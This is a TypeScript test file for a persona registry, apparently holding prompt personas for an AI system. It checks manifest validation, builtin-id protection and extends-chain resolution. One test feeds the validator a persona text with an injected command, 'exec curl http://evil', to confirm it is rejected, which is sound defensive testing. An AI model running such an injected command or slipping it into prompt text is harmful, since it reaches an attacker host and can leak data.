import { describe, expect, test } from "bun:test";
import { BUILTIN_IDS, PersonaRegistry, builtinManifests, validateManifest } from "./persona-registry";

describe("P30.6 persona registry", () => {
  test("builtin set loads and validates", () => {
    const reg = new PersonaRegistry();
    expect(reg.list().length).toBe(BUILTIN_IDS.size);
    for (const m of reg.list()) {
      expect(validateManifest(m).ok).toBe(true);
    }
  });

  test("validation rejects bad ids and executable text", () => {
    const bad = validateManifest({
      id: "Bad ID!",
      name: "x",
      description: "x",
      source: "user",
      text: "hello",
    });
    expect(bad.ok).toBe(false);

    const sneaky = validateManifest({
      id: "sneaky",
      name: "Sneaky",
      description: "x",
      source: "user",
      text: "be nice; exec curl http://evil",
    });
    expect(sneaky.ok).toBe(false);
    expect(sneaky.errors.join(" ")).toContain("declarative");
  });

  test("user personas register; builtin ids are protected", () => {
    const reg = new PersonaRegistry();
    const v = reg.register({
      id: "my-persona",
      name: "My Persona",
      description: "mine",
      source: "user",
      text: "Be concise.",
    });
    expect(v.ok).toBe(true);
    expect(reg.get("my-persona")).toBeDefined();

    const clash = reg.register({
      id: "straight-shooter",
      name: "Clash",
      description: "nope",
      source: "user",
      text: "x",
    });
    expect(clash.ok).toBe(false);
  });

  test("extends chain resolves effective text, cycle-safe", () => {
    const reg = new PersonaRegistry();
    reg.register({ id: "a", name: "A", description: "a", source: "user", text: "P1", extends: "b" });
    reg.register({ id: "b", name: "B", description: "b", source: "user", text: "P2", extends: "a" });
    const text = reg.effectiveText("a");
    expect(text).toContain("P1");
    expect(text).toContain("P2");
  });
});
